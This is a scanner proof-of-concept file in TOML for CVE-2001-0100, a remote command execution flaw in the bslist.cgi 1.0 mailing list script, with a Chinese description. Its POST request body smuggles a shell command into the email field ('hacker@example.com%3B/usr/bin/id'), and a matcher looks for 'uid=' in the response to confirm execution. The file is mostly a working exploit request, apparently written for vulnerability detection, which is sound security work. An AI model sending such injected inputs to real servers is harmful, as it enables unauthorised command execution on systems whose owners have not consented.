[info]
author = "AVE"
description = "bslist.cgi 邮件列表脚本未过滤分号等 shell 元字符，通过提交包含命令注入的邮箱地址可远程执行任意命令。PoC 通过 POST 请求提交恶意邮箱地址触发命令执行。"
id = "POC-AVE-2001-0043"
name = "Brian Stanback bslist.cgi 1.0 远程命令执行 PoC"
severity = "critical"
tags = ["ave-2001-0043"]
vuln_id = [
    "CVE-2001-0100",
    "AVE-2001-0043",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/bslist.cgi"
protocol = "http"

[poc.requests.body]
content = "email=hacker@example.com%3B/usr/bin/id&action=subscribe"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
